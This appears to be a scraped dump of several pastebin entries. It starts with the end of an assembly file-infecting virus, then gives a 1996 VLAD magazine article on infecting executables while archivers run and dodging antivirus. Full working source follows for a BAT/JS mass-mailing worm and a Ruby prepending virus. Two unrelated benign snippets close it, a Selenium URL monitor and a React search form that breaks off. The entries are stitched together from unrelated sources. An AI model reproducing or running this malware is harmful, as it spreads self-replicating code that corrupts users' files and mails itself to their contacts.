	int	0x21				; Execute it

	mov	ax, 0x4200			; Set File Pointer (encrypted)
	inc	al				; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	push	dx				; dx to the stack again
	int	0x21				; Execute it

	pop	dx				; Get offset where to read from stack to dx
	add	dx, 0x10			; Add 16 to dx (As we need the next 16 bytes)
	push	dx				; To the stack again

	mov	ah, 0x30			; Read from file (encrypted)
	add	ah, 0xF				; Decrypt
	mov	cx, 0x10			; How much to read (16 bytes)
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	mov	ax, 0x4002			; Set File Pointer to end (encrypted)
	add	ax, 0x200			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0x25			; Write to file (encrypted)
	add	ah, 0x1B			; Decrypt
	mov	cx, 0x10			; How much to write: 16 byte
	lea	dx, [bp+com_men_buffer2]	; What to write: First bytes of file for buffer
	int	0x21				; Execute it

	dec	di				; Decrease di
	test	di, di				; test di if zero
   jnz	com_men_st2end				; If not zero, write next 16 byte

	mov	ax, 0x2200			; Set File Pointer to start (encrypted)
	add	ax, 0x2000			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0x6201			; Set File Pointer (encrypted)
	sub	ax, 0x2000			; Decrypt
	xor	cx, cx				; cx=0
	pop	dx				; dx=offset to read
	int	0x21				; Execute it

	mov	ah, 0x20			; Read from file (encrypted)
	add	ah, 0x1F			; Decrypt
	pop	cx				; Get REST
	push	cx				; Save REST again
	lea	dx, [bp+com_men_buffer2]	; Where to store
	int	0x21				; Execute it

	xor	ax, ax				; Set File Pointer to end (encrypted)
	add	ax, 0x4202			; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ah, 0xFB			; Write to file (encrypted)
	xor	ah, 0xBB			; Decrypt
	pop	cx				; How much to write: REST bytes
	lea	dx, [bp+com_men_buffer2]	; What to write: REST bytes
	int	0x21				; Execute it

virinclude:					; Virus-Include-Part
	mov	ax, 0xBDFF			; Set File Pointer to start (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	xor	dx, dx				; dx=0
	int	0x21				; Execute it

	mov	ax, 0xBDFE			; Set File Pointer (encrypted)
	not	ax				; Decrypt
	xor	cx, cx				; cx=0
	mov	dx, [bp+com_men_buffer1+0xC]	; destination: Entry Point
	int	0x21				; Execute it

	mov	ah, 0x53			; Write to file (encrypted)
	xor	ah, 0x13			; Decrypt
	mov	cx, viruslength			; How much to write: Viruslength
	mov	dx, bp				; What to write: Viruscode
	add	dx, START			; Get relative offset
	int	0x21				; Execute it

com_men_FNF:
	mov	ah, 0xD0			; Close file (encrypted)
	xor	ah, 0xEE			; Decrypt
	int	0x21				; Execute it

	mov	ah, 0xA1			; Find Next File (encrypted)
	xor	ah, 0xEE			; Decrypt
	jmp	c_men_infection			; Infect it

ret_host:


	mov	di, 0x200			; di=0x100 (as it's a COM-file) (encrypted)
	sub	di, 0x100			; Decrypt
	jmp	di				; Jump to di (Jump to Host-start)


	com_men_string	db '*.*',0		; FileMask for MENUETs
	com_string	db '*.com',0		; FileMask for COMs
	com_men_buffer1: times 0x10 db 0x0	; 16 byte buffer for Menuet-Sign
	com_men_buffer2: times 0x10 db 0x0	; 16 byte buffer for Saving the Hostfile
	com_4bytes	db 0xE9, 0x0, 0x0 ,'S'	; Jmp to virus + Infection Mark
	com_rest_bytes	db 0xCD, 0x20, 0x90, 0x90	; 1st Generation only: int 0x20 | NOP | NOP

end_virus:                     ;ENDE
I_END:"
MEadxGNq,VLAD Magazine - Issue #7 - ARTICLE.4_2 - Archive Infect/Infection on Compression,FlyFar,Email,Monday 3rd of July 2023 01:09:47 AM CDT,"    S T R A T E G Y : I N F E C T I O N  O N  C O M P R E S S I O N
	 _______________________________________________________________

        (c) 1996 by MGL. None of this article may be used or
	    spread in any form without written permission of the
	    author. All rights are reserved for future use.


	0.) Sad news

        I am not proud to announce to the world that our group,	SVL
        ended work due to some unfortunate circumstances.
	So that was that. :-((((((((((((((((((((((((((((((((((((((


	1.) Introduction.


Well, it has been discussed many times, switching to fast infection when an
attempt to run some compression software is made.  It is a kewl idea and
moreover a good way to penetrate the backups. But nothing is as easy as
it appears to be. This is also the reason why I want to share some of my
latest experiences with you.

Basically, I assume all of you can code a resident virus, because if
you can't, just skip this article or read it again sometime in
the near ( or far if you're lazy ) future.
All the code presented in this article is meta-code, it just illustrates
the way the virus should work. It's not optimised, nor part of any virus.


	2.) Which packer should I support in the virus ?


Good question. There are shitloads of them. It's a complete waste of
code to support packers that aren't very common. You should select only
those that every lamer has on his HD. That means ( present situation )
supporting ARJ, Pkzip/Pkunzip, RAR, LHA, UC. If you decide to select these
five packers, it is nearly guaranteed your virus can hurt 90 % of systems
in the whole Universe.  Ofcos, in some regions there's another list of
'most used ', but remember : you're the author, you have the choice.
You do not need know how good these packers are ( that isn't 100 % true, cos
the better are used more ), all you need to know is how the packers work.


	3.) How the packer works.


Uff ! Don't be scared, you don't need to disassemble the whole packer !
( of cos it is once again not 100 % true, so obtain Soft-ice 2.80 now )
It is about knowing the principles WHAT THE PACKER SHOULD DO. Every packer
works similarly to that described below : 


	1.  Find files to be packed
	2.  Open/create file in which everything'll be packed
	3.  Find 1st file to be packed
	4.  Open the file to be packed
	5.  Pack the file
	6.  Add packed file to archive
	7.  Close file to be packed
	8.  Last file ? If so , go to line 10
	9.  Find next file to pack and go to line 4
	10. Close archive and exit

Simple, isn't it ? But in section 5.) i'll describe possible problems.


	4.) What should the virus do ?


As I mentioned in the introduction, the virus has to be resident. Then it
will control all INT 21H / 4BH calls. If such a call apprears just test to
see if the ASCIIZ ( ASCII , ended by '0' ) string pointed by DS:DX contains
one of the names of the supported packers.  Then, if your virus is stealth
(and I hope it is ), switch all stealth capabilities off. You ask why ?
The reason is simple : the packer needs to know the real file size of the
file being processed, and of course the virus can't infect any file without
knowing its real size . Second, set the infection mode to the 'fastest
possible' - what that means is open for further discussion. And thats all
folks on INT 21H / 4BH for now.

Thirdly, infect the files ( this important point'll be discussed later in
this article ). And last but not least, on INT 21H / 4CH don't forget to
disable the 'fastest possible' infection mode and for the Lamer's sake, turn
all stealth back on !

If you are suspicious and you know Murphy's Law 'If something can go wrong,
it will ! ', you should also handle the situation when the packer calls for 
an external compression executable called e.g. 'fucklame.exe' which
after processing the file and creating the compressed image in memory exits
via the normal INT 21H / 4CH back to the packer. According to the stuff you
read above, the virus now turns stealth on and sets another infection
strategy ...

To prevent such a mistake, you can get the current PID ( segment address of
the PSP of current process ) by using INT 21H / 62h or INT 21h /51H - both
calls are equal and moreover - BOTH DO NOT USE ANY OF THE DOS INTERNAL STACKS 
and that means you can use structures like

	mov ah,62h
	int 21h
or
	mov ah,51h
	int 21h

directly in your interrupt handler ( in DOS 3.0 and above ) ! Both the calls
return in the PID in BX so then

	mov word ptr cs:[U_cant_fool_me-ReloCount],bx

and after storing the PID allow normal INT 21H / 4BH. Then you can test on
INT 21H / 4CH the parents PID

int21_fn_4c_entry:
	push bx
	push ds
	push ax
	mov ah,51h
	int 21h
	mov ds,bx
	mov ax, word ptr [ds:16h]

because the PSP on offset+16h holds the segment of parent PID ( from which
the file has been executed via INT 21H / 4Bh and whose PID we have stored 
in the variable U_cant_fool_me ), the following code applies:

	cmp word ptr cs:[U_cant_fool_me-ReloCount],ax
	jne skip_some_lines
	mov byte ptr cs:[Stealth-ReloCount],switch_on
	mov byte ptr cs:[Strategy-ReloCount],another_one
skip_some_lines:
	pop ax
	pop ds
	pop bx
	jmp far ptr dword cs:[Original_DOS_vector-ReloCount]

Now you can be sure that your virus turn on stealth only when the packer
really ends its work. The same structure on INT 21H /4CH can be used when
you handle some AV, and you also disable stealth for this reasson.


	5.) When to infect the file ?


To questions answer is not as trivial as it seems to be !
It is caused by :
	a.) The way packer works
	b.) The virus itself

b.)
I am sorry , but i'll discuss the point b.) as first . There are only two
'not very suspicious' ways to mark the file as infected which aren't too
hard to code : time-stamp ( preferrably some specific legal one ) and size
padding.
Time stamp marking is very easy to code and works well with full file stealth
but when you support some packers in your virus, get ready for big trouble.
All the needed stuff is in the section 'Time stamp viruses'.
Size padding is harder to code, with full-stealth it's quite complicated, but
you'll probably have no problems with implementing packer support in your vx,
with only one exception, see the section 'Size padding viruses' for details.

a.)
According to algorithm described in section 3.) everyone can assume that the
right moment for infection is INT 21H / 3DH - open file . This conclusion is
up to 95% correct . It has lot of strong points : DX:DX points to a buffer
which contains an ASCIIZ string with filename and path, the 3 lowest bites
in  AL describe the open mode ( 000 - read , 001 - write , 010 - read and
write ). So it is easy to force it open for read/write access, and infect 
the file pointed by DS:DX . Ofcos, I can tell you, it is not :-)

  
	6.) Solutions


	6.1. ) Size padding viruses.


This section'll be very short . There is no reason the strategy described in
section 5a. could fail with most packercs. Because if your virus infects the
file on file open, and then marks it by padding the size to some 'magic'
value, the packer should reach the EOF mark . Our virus will, after executing
the packer, infect the file and then pad the file to the 'magic' size. Then 
the compressed file will be infected.  That means the infected file will be
marked as infected and correctly stealthed . There is ONLY one EXCEPTION i 
know : PKZIP . How to fool this one is described in section 6.2
Maybe the packer will protest when extracting the files from the archive,
because the stored size in archive header and size of extacted file
didn't match, but there's only a small probability that the packer checks
for this.

I have to say, I didn't test the file padding with archivers - cos i was too
lazy to code it. But of all 5 packers tested by me, only pkzip causes
problems. RAR , UC , ARJ , LHA - all read until EOF is reached !


	6.2. ) Time stamp viruses .


So this section is really the crucial part of the article . If you use the
strategy from section 5a you 'll get following result :


  Packer name                   F1              F2              Result
		
	LHA                     +               +                GOOD
		
	RAR                     +               -                POOR

	ARJ                     +               -                POOR

   Pkzip/Pkunip                 +               -                POOR

	UC                      +               -                POOR

Legend :        F1 - file which was infected on archivation and is located in
		     specified directory
		F2 - file which has been extracted from archive we infected
		+  - infected and stealthed
		-  - infected and not stealthed

As you can see something went wrong. And after breaking your head with this
little problem you say : "" Shit, the file is not marked as infectded !"". And
that's problem we have to solve. If you are lazy, support only LHA . But for
correctly infecting with other packers we need to infect the file and mark it
PRIOR to opening.

Every packer has to scan the actual directory for files which should be
compressed.  This is done by just a normal INT 21H / 4Eh and INT 21H / 4FH. 
As i assume your virus has at least semi-stealth implemented, then your virus
has to handle these two subfunctions of INT 21H. After such a call the virus
fixes the file size in the DTA ( Disk Transfer Address ) - I hope it's called
semi-stealth.  Handling INT 21H FN 4EH /4FH will add only few lines of extra
code to your virus.
The situation before such a call from the packer is mostly as described
below :


 �����> DS:DX  point to ASCIIZ filename to match. Mostly it contains something
 �             like '????????.???',0
 �      AH     of course 4EH or 4FH
 �      CX     atributes to match, for us uninteresting, cos every normal
 �             virus can infect files with any attributes set
 �
 ������ As you can see, nothing useful for our purposes :-P

Here i would like to note, that you do not need to know path to files which
should be compressed or the name of the actual directory . You are already
in the directory where the target files are located ( courtesy of the packer
which is active ) , or the call will fail.


But the situation right after the allowed call of INT 21H 4EH/4FH is the most
important for us : if the call fails, nevermind, try it next time. If the
call succeded, the DTA is filled with data we require. Here is the DTA
structure once again :


	������������������������������������������������������������Ŀ
	� 00h � bits 0-6 holds drive letter , bit 7 is set if remote �
	������������������������������������������������������������Ĵ
	� 01h � 11 bytes search template                             �  
	������������������������������������������������������������Ĵ
	� 0Ch � search atributes                                     �  
	������������������������������������������������������������Ĵ
	� 0Dh � entry count within directory                         �  
	������������������������������������������������������������Ĵ
	� 0Fh � cluster number of start of parent directory          �  
	������������������������������������������������������������Ĵ
	� 11h � 4 bytes reserved                                     �  
	������������������������������������������������������������Ĵ
	� 15h � atributes of file which was found                    �  
	������������������������������������������������������������Ĵ
	� 16h � file time                                            �  
	������������������������������������������������������������Ĵ
	� 18h � file date                                            �  
	������������������������������������������������������������Ĵ
	� 1Ah � file size , this one is DWORD !                      �  
	������������������������������������������������������������Ĵ
	� 1Eh � filename and extension in ASCIIZ                     �  
	��������������������������������������������������������������

As you can see, offset DTA+1Eh is the ASCIIZ file name - we 'll need it
for file open. 

int21_fn_4e_entry:
int21_fn_4f_entry:
	pushf
	call far ptr dword cs:[Original_DOS_vector-ReloCount]
	pusha
	push es
	push ds
	pushf

First check if the archiver is actually processing. If not, skip the whole
infection stuff.

	cmp byte ptr cs:[Archiver_active_flag-ReloCount],set
	jne Skip_infection

To get the filename from the DTA is easy

	mov ah,2f
	pushf
	call far ptr dword cs:[Original_DOS_vector-ReloCount]

ES:BX now points to the beginning of the DTA, so ES:BX+1EH is the filename
and ES:BX+26H points to file extension. Remember the file is not yet open.
But before opening a test for *.exe or *.com has to be done.

	push es
	pop ds
	add bx,1eh
	xchg bx,dx
	cmp word ptr ds:[dx+8],'XE'
	je Open_file
	cmp word ptr ds:[dx+8],'OC'
	jne Exit
Open_file:
	mov ax,3d02h
	pushf
	call far ptr dword cs:[Original_DOS_vector-ReloCount]
	jc Exit
	xchg ax,bx
	call Infect_file

Here you have a free choice. You can infect the filename pointed to by DS:DX
or the handle in bx . Both are quite easy to code.

	pushf
	mov ah,3e
	call far ptr dword cs:[Original_DOS_vector-ReloCount]


As the DTA is filled with data, we need to test if stealth is necessary

Skip_infection:
	cmp byte ptr cs:[Stealth-ReloCount],switch_off
	je Skip_size_stealth
	call Size_stealth_on_4e_and_4f


Before exiting pop all stored registers 

Skip_size_stealth:
Exit:
	popf            ; btw, do you know that such a exit can hang
	pop ds          ; the system sometimes ? Everytime you push the 
	pop es          ; flags on the stack inside an interrupt handler, any
	popa            ; other interrupts are disabled. So this part
	retf 2          ; of code can exit the handler with disabled
			; interrupts . That may cause the system to hang with
			; some software written in asm. Languages like
			; C++ and Pascal ( |-P ) have this fixed...

So, now our virus infects files on INT 21H / 4EH and INT 21H / 4FH. But
at this moment that doesn't change anything in the DTA after INT 21H 4EH/4FH.
If we repeat the tests with all packers again , we'll get these results :


  Packer name                   F1              F2              Result
		
	LHA                     +               +                GOOD
		
	RAR                     +               +                GOOD

	ARJ                     +               +                GOOD

   Pkzip/Pkunip                 +               -                POOR

	UC                      +               -                POOR


Just changing the INT 21H subfunction on which the virus infects files with
no code addition caused correct infection with two other packers. But
Pkzip/Pkunzip and UC are still a problem for our virus . You can change
the subfunction all you want but this method'll bring nothing more.

As i dissassembled those two 'nice' packers , i found such a structure :

	1.      Get DTA ( INT 21H / 2Fh )
	2.      Store it on the stack
	3.      Set new DTA ( INT 21H / 1A )
	4.      Find 1st matching file ( INT 21 / 4E )
	5.      Pop saved stuff
	6.      Restore original DTA
	and the same x-times round ....

 No open file here !!! That means in plain text : UC and Pkzip first get
information about all the files and then start to process it all. And
as we allowed the INT 21H / 4EH or INT 21H / 4FH call and then infected the
victim, no change in the DTA has been done and so the packer uses values
which were correct BEFORE INFECTION, but aren't afterwards ! The problem is
about fixing the DTA.

UC only requires fixing the file time in the DTA for correct infection. That
means patching the word at address DTA+16H to our value (eg. 40 seconds ).
Then will UC works with our virus fine.

With Pkzip/Pkunzip the situation not so easy. From all five packers tested
by me, only this one gets the size of the packed file from the DTA saved
earlier. That means the packed infected executable will always be corrupted.
Cruel, isn't it ? To fix the problem, we have to fix the DTA, but not only
the file time, but also the file size in DTA. That means to add the size
of the added code to the word at address DTA+1AH and to fix file time on
DTA+16H . 


If you modify the virus code as described above, you get nice results :


  Packer name                   F1              F2              Result
		
	LHA                     +               +                GOOD
		
	RAR                     +               +                GOOD

	ARJ                     +               +                GOOD

   Pkzip/Pkunip                 +               +                GOOD

	UC                      +               +                GOOD



	7.) Summary .

To infect a file when a packer is working is a good way of spreading.
The best point for infection is INT 21H / 4EH and INT 21H / 4FH. Just
by placing the infection routine here you can infect RAR, ARJ and LHA with
no problems at all ( no matter what you use as infection marker ). If you
want to handle infection with UC, and your virus uses file time/date
as an infection marker you have to fix it in the DTA after infection.
The most shitty packer is Pkzip/Unzip. You have to handle DTA file time/date 
and file size. This DTA size-fix is NECESSARY for BOTH usual TYPES OF MARKER 
( size padding & time stamp ), cos pkzip processes files only to ITS SAVED
FILE SIZE.

Ofcos, there are several problems here. A packer with graphical user
interface ( rar , uc ) can show the size of the added code, or even the
whole virus ( rar ) as most viruses have stealth disabled when some
packers are active. The possible solution  -  analysing the command
line parameters - is too complicated, too long, so the best idea is
to forget it, hoping the user won't notice it at all. [ this is
the method of solving a problem by it's ignoration - quite common in the
software industry :-) , so why not use it in viruses ? ]
Moreover, the most bloody situation is with AV products able to test
packed archives. Here there is nearly no way to stealth the infected files.
But, this problem can be also ignored, cos testing archives for
infection is slow and takes shitload of time, so the normal user has his
AV package configured to skip testing archives.

And last but not least, the viruses' spread could be too fast, ofcos 
this one problem can be handled very easy . 


I hope this article helped you to gain new information. I am open
for any discussion, and i'll welcome any tips and hints u can tell
me. I can be reached on IRC, on #........ and #... ( channel names
were cleared by the ........ ( also cleared )
"
gpWve3cc,Virus.Bat/JS.Charon - Source Code,FlyFar,JavaScript,Monday 3rd of July 2023 01:07:54 AM CDT,"/*
:: BAT|JS.Charon
:: by Second Part To Hell[rRlf]
:: www.spth.de.vu
:: spth@aonmail.at
:: Austria
:: written on 15.02.2003
::
:: Special things:
:: The virus is able to spread via expansion BAT and JS!
:: If it runs via JS it works in this way:
:: --> It makes a VBS file which send eMails with the virus
:: --> Than it opens the vbs file (now the virus is spreat via eMail)
:: --> It copies itself to a BAT file
:: --> This BAT file infect all JS, BAT and CMD files
:: If it runs via BAT it works in this way:
:: --> It infect all JS, BAT and CMD files
:: --> copy itself to a JS file
:: --> run he JS file
:: Something else interessting:
:: It uses different subjects, bodys and attachment-names
:: Also sometimes the attachment-name is ""BAT"" and sometimes ""JS"". ;)
:: I used a VBS file to spread for avoing AV-detection (because I crypt some parts of the vbs-file)
:: Thanks goes to:
:: T-2000[IR]     <-- I-Worm.Dawn  <-> for the random-thing
:: AlcoPaul[b0]   <-- BatXP.RarMee <-> for some ideas ;)
:: Kefi[rRlf]     <-- FSO-Tutorial <-> for more ideas :D
*/

/*
goto bat
*/
var fso=WScript.CreateObject(""Scripting.FileSystemObject"")
var shell=WScript.CreateObject(""Wscript.Shell"")
var MySf=fso.OpenTextFile(WScript.ScriptFullName,1)
var MySC=MySf.ReadAll()
MySf.Close()
var cra=""Next""
var crb=""Send""
var crc=""Attachments""
var crd=""Add""
var cre=""Address""
var charon=fso.CreateTextFile(""charon.js"")
charon.WriteLine (MySC);
charon.Close();


var sur=Math.round(Math.random()*5)+1
if (sur==1) 
{ var subject=""Hi"";
}
if (sur==2) 
{ var subject=""Hello!"";
}
if (sur==3) 
{ var subject="";-)"";
}
if (sur==4)
{ var subject=""(none)"";
}
if (sur==5)
{ var subject=""FWD:""
}

var bor=Math.round(Math.random()*5)+1
if (bor==1) 
{ var body=""A nice pic waits for opening"";
}
if (bor==2) 
{ var body="""";
}
if (bor==3) 
{ var body=""Hi! what's up with u? open this little photo of charon!!"";
}
if (bor==4)
{ var body=""Do you know Charon? Here is it!"";
}
if (bor==5)
{ var body=""Charon loves u! ;)""
}

var atr=Math.round(Math.random()*5)
if (atr==1) 
{ var attachmenta=""lovely_mouse"";
}
if (atr==2) 
{ var attachmenta=""charon_meets_u"";
}
if (atr==3) 
{ var attachmenta=""Sexy_girl_on_charon"";
}
if (atr==4)
{ var attachmenta=""charon"";
}
if (atr==5)
{ var attachmenta=""hot_lickin""
}

var attr=Math.round(Math.random()*2)
if (attr==1)
{ var expan="".bat"";
}
if (attr==2)
{ var expan="".js"";
}

var attachment=""C:\\""+attachmenta+expan
var email=fso.CreateTextFile(""email.vbs"")
email.WriteLine (""On Error Resume Next"")
email.WriteLine (""Set fso=CreateObject(""+unescape(""%22"")+""Scripting.FileSystemObject""+unescape(""%22"")+"")"")
email.WriteLine (""Set out=Wscript.CreateObject(""+unescape(""%22"")+""Outlook.Application""+unescape(""%22"")+"")"")
email.WriteLine (""Set mapi=out.GetNameSpace(""+unescape(""%22"")+""MAPI""+unescape(""%22"")+"")"")
email.WriteLine (""Set a = mapi.""+cre+""Lists(1)"")
email.WriteLine (""For x=1 To a.""+cre+""Entries.Count"")
email.WriteLine (""Set Mail=ol.CreateItem(0)"")
email.WriteLine (""Mail.to=ol.GetNameSpace(""+unescape(""%22"")+""MAPI""+unescape(""%22"")+"").""+cre+""Lists(1).""+cre+""Entries(x)"")
email.WriteLine (""Mail.Subject=""+unescape(""%22"")+subject+unescape(""%22""))
email.WriteLine (""Mail.Body=""+unescape(""%22"")+body+unescape(""%22""))
email.WriteLine (""Mail.""+crc+"".""+crd+""(""+unescape(""%22"")+attachment+unescape(""%22"")+"")"")
email.WriteLine (""Mail.""+crb)
email.WriteLine (cra)
email.WriteLine (""ol.Quit"")
email.Close()
shell.run (""email.vbs"");
if (fso.FileExists(""C:\\charon.bat""))
{
}
else
{
  fso.CopyFile(""charon.js"",""C:\\charon.bat"");
  shell.run (""C:\\charon.bat"");
}
/*
:bat
copy %0 C:\charon.bat
echo off
set a=goto
set a=for
goto pluto
set a=set
:pluto
%a% %%a in (*.bat ..\*.bat %windir%\*.bat %path%\*.bat) do copy %0 %%a
%a% %%b in (*.js ..\*.js %windir%\*.js %path%\*.js) do copy %0 %%b
%a% %%c in (*.cmd ..\*.cmd %windir%\*.cmd %path%\*.cmd) do copy %0 %%c
if exist C:\charon.js goto charon
copy %0 C:\charon.js
cscript C:\charon.js
:charon
exit
*/"
BVKQBAqa,Virus.Ruby.Paradoxon - Source Code,FlyFar,Ruby,Monday 3rd of July 2023 01:05:52 AM CDT,"#  RUBY.Paradoxon
#  by Second Part To Hell
#  www.spth.de.vu
#  spth@priest.com
#  written in november 2004
#  in Austria (as a free world citizen)
#
#  The virus you can see now is, as the name already says, a RUBY file infector.
#  You may ask, what the hell is RUBY? Well, it's a web-based script language from
#  japan, where it is very famous and often used. I've read about that language
#  in a Linux Magazine (with the special Knoppix 3.6-scripting edition CD), and I
#  wanted to try it (write a virus for it). OK, I've downloaded the Installation
#  pack (http://www.geocities.co.jp/SiliconValley-PaloAlto/9251/ruby/main.html) for
#  Ruby 1.8.1.2 and the 'Ruby Language Reference Manual'. Then i've started to learn
#  it, and soon I've understood the main parts of the syntax, some important methods
#  and objects and so on. And as a result of my work, you can find the virus here.
#
#  RUBY.Paradoxon is a prepender-virus, which infects all .rb (Ruby) files in the
#  current directory. It doesn't harm the host in any way nor it has any other payload.
#
#  I'm going to write one advanced Ruby virus and write a tutorial about Ruby-infections
#  soon. I've named my virus Paradoxon, because the existence of such a virus is very
#  strange. I hope you enjoy the little trip into a world, nobody has ever met before :)
#
#
# RUBY.Paradoxon
mycode=File.open(__FILE__).read(630)
cdir = Dir.open(Dir.getwd)
  cdir.each do |a|
    if File.ftype(a)==""file"" then
      if a[a.length-3, a.length]=="".rb"" then
        if a!=File.basename(__FILE__) then
          fcode=""""
          fle=open(a)
          spth=fle.read(1)
          while spth!=nil
            fcode+=spth
            spth=fle.read(1)
          end
          fle.close
          if fcode[7,9]!=""Paradoxon"" then
            fcode=mycode+13.chr+10.chr+fcode
            fle=open(a,""w"")
              fle.print fcode
            fle.close
          end
        end
      end
    end
  end
cdir.close"
6wbwQXQV,Monitora urls,MizunoBrasil,Python,Monday 3rd of July 2023 12:52:09 AM CDT,"import tkinter as tk
from tkinter import ttk
import threading
import time
import webbrowser
from selenium import webdriver

class URLMonitor(threading.Thread):
    def __init__(self, treeview, driver):
        threading.Thread.__init__(self)
        self.treeview = treeview
        self.driver = driver
        self.running = True
        self.last_url = """"

    def run(self):
        while self.running:
            try:
                # Obtenha a URL atual
                url = self.driver.current_url
                # Obtenha o título da página atual
                page_title = self.driver.title

                if url != self.last_url:
                    # Adicione a URL e o título à treeview
                    self.treeview.insert("""", ""end"", values=(url, page_title))
                    self.last_url = url
            except Exception as e:
                print(f""Erro ao capturar URL: {e}"")

            time.sleep(1)

    def stop(self):
        self.running = False


def save_titles(treeview):
    try:
        with open(""titles.html"", ""w"") as file:
            file.write(""<html>\n"")
            file.write(""<body>\n"")

            items = treeview.get_children()
            for item in items:
                values = treeview.item(item)[""values""]
                if ""URL Monitor"" not in values[1] and ""Nova guia - Google Chrome"" not in values[1]:
                    title = values[1]
                    url = values[0]
                    file.write(f'<a href=""{url}"">{title}</a><br>\n')

            file.write(""</body>\n"")
            file.write(""</html>\n"")
        print(""Títulos exportados com sucesso."")
    except Exception as e:
        print(f""Erro ao exportar títulos: {e}"")




def open_browser(event, treeview, driver):
    item = treeview.selection()[0]
    url = treeview.item(item)[""values""][0]
    webbrowser.open(url)


def main():
    # Configurar janela
    root = tk.Tk()
    root.title(""URL Monitor"")
    root.geometry(""500x400"")

    # Configurar Treeview
    treeview = ttk.Treeview(root)
    treeview[""columns""] = (""URL"", ""Page Title"")
    treeview.heading(""URL"", text=""URL"")
    treeview.heading(""Page Title"", text=""Page Title"")
    treeview.pack(expand=True, fill=tk.BOTH)

    # Configurar Selenium WebDriver
    driver = webdriver.Chrome()  # Adapte para o driver que você estiver usando

    # Configurar URL Monitor
    monitor = URLMonitor(treeview, driver)
    monitor.start()

    def on_closing():
        monitor.stop()
        driver.quit()
        root.destroy()

    def export_titles():
        save_titles(treeview)

    export_button = ttk.Button(root, text=""Exportar"", command=export_titles)
    export_button.pack()

    treeview.bind(""<Double-1>"", lambda event: open_browser(event, treeview, driver))

    root.protocol(""WM_DELETE_WINDOW"", on_closing)
    root.mainloop()


if __name__ == ""__main__"":
    main()
"
VuZe3bUY,Untitled,ibnufathoni,JavaScript,Sunday 2nd of July 2023 11:03:55 PM CDT,"import { Fragment, useState } from ""react"";
import {
    Container,
    Input,
    Label,
    FormGroup,
    Button,
    Col,
    Row,
    Card,
    CardBody,
    CardTitle,
    CardText,
    CardSubtitle,
    Form
} from ""reactstrap"";
import { API } from ""../../../common/API"";

export default function Search(){
    const [nameCar, setNameCar]= useState('')
    const [category, setCategory] = useState('')
    const [isRented, setIsRented] = useState(false)
    const [price, setPrice] = useState('')
    const [data, setData] = useState([])
    const [isLoading, setIsLoading] = useState(false)
    const [isSubmitted, setIsSubmited] = useState(false)
    const [detailData, setDetailData] = useState({})
    const [isClick, setIsClick] = useState(false)

    const fetchData = () => {
        const params = `name=${nameCar}&category=${category}&isRented=${isRented}&${mappingPrice(price)}`
        API.get(`admin/v2/car?${params}&page=1&pageSize=10`).then(res=>{
            setData(res.data.cars)
        }).catch(err =>{
            console.log('err:', err)
        }).finally(()=>{
            setIsLoading(false)
        })
    }

    const fetchDataDetail = (id) => {
        API.get(`admin/car/${id}`).then(res=>{
            setDetailData(res.data)
        }).catch(err =>{
            console.log('err:', err)
        })
    }

    const mappingPrice = (price) => {
        switch(price){
            case 'low':
                return 'minPrice=0&maxPrice=400000'
            case 'medium':
                return 'minPrice=400000&maxPrice=600000'
            case 'high':
                return 'minPrice=600000&maxPrice=1000000'
            default:
                return ''
        }
    }

    const formatToIDR = (idr) => {
        const parsed = idr.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.');

        return `${'Rp '}${parsed}`;
    }

    const handleSubmit = (e) => {
        e.preventDefault();
        setIsSubmited(true)
        setIsLoading(true)
        fetchData();
    }

    const handleClick = (id) => {
        setIsClick(true)
        fetchDataDetail(id);
    }

    return (
        <>
            <section id=""formSewa"" className=""mb-5"">
                <Container className=""container"">
                    <Row className=""row"">
                        <Col md={10} className=""col-md-10"">
                            <Form className=""my-sm-4 d-block d-md-flex justify-content-around align-self-center"">
                                <FormGroup className=""my-md-3 input-grup align-content-center justify-content-center"">
                                    <Label htmlFor=""name"" className=""form-label"">Nama Mobil</Label>
                                    <Input type=""text"" className=""form-control d-inline"" id=""name"" disabled={isSubmitted}
                                           aria-describedby=""emailHelp"" placeholder=""Ketik nama/tipe mobil""
                                           width=""208"" onChange={e=>setNameCar(e.target.value)}/>
                                </FormGroup>
                                <FormGroup className=""my-3 input-grup align-content-center justify-content-center"">
                                    <Label htmlFor=""kapasitas"" className=""form-label"">Kategori</Label>
                                    <Input type=""select"" id=""kapasitas"" className=""form-select text-secondary"" onChange={e=>setCategory(e.target.value)}>
                                        <option hidden >Masukkan Kapasitas Mobil</option>
                                        <option className=""text-black"" value=""small"">2 - 4 orang</option>
                                        <option className=""text-black"" value=""medium"">4 - 6 orang</option>
                                        <option className=""text-black"" value=""large"">6 - 8 orang</option>
                                    </Input>
                                </FormGroup>
                                <FormGroup className=""my-3 input-grup align-content-center justify-content-center"">
                                    <Label htmlFor=""harga"" className=""form-label"">Harga</Label>
                                    <Input type=""select"" id=""harga"" className=""form-select text-secondary"" disabled={isSubmitted} onChange={e=>setPrice(e.target.value)}>
                                        <option hidden >Masukkan harga sewa per hari</option>
                                        <option className=""text-black"" value=""low"">Rp. 400.000</option>
                                        <option className=""text-black"" value=""medium"">Rp. 400.000 - Rp.600.000</option>
                                        <option className=""text-black"" value=""high""> > Rp.600.000</option>
                                    </Input>
                                </FormGroup>
                                <FormGroup className=""my-3 input-grup align-content-center justify-content-center"">
                                    <Label htmlFor=""status"" className=""form-label"">Status</Label>
                                    <Input type=""select"" id=""status"" className=""form-select text-secondary"" disabled={isSubmitted} onChange={e=>setIsRented(e.target.value)}>
                                        <option className=""text-black"" value={true}>Disewa</option>
                                        <option className=""text-black"" value={false}>Free</option>
                                    </Input>
                                </FormGroup>
                                {isClick ?
                                    ("""")
                                     : isSubmitted ? (
                                        <Button type=""submit"" className=""btn btn-primary align-self-center btn-edit""
                                                onClick={() => {
                                                    setIsSubmited(false)
                                                    setData([])
                                                    setIsClick(false)
                                                }}>Edit</Button>
                                    ) : (
                                        <Button onClick={handleSubmit}
                                                className=""btn btn-primary align-self-center"">Cari Mobil</Button>
                                    )
                                }
                            </Form>
                        </Col>
                    </Row>
                </Container>
            </section>

